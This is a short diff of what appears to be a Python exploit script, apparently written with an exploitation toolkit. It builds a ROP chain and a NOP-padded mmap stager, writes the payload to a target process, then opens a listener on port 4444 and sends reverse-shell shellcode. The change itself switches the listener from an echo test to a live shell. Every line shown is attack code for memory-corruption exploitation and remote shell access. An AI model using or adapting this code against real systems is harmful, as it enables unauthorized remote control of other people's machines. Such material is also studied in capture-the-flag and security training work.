@@ -21,5 +21,5 @@ buf += rop.fill(60, buf)
 buf += sc.nopfill(sc.mmap_stager(), 100, buf)
 
 p.write(buf)
-with p.listen(4444, echotest=True) as (host, port):
+with p.listen(4444, is_shell=True) as (host, port):
     p.write(sc.reverse_shell(host, port))
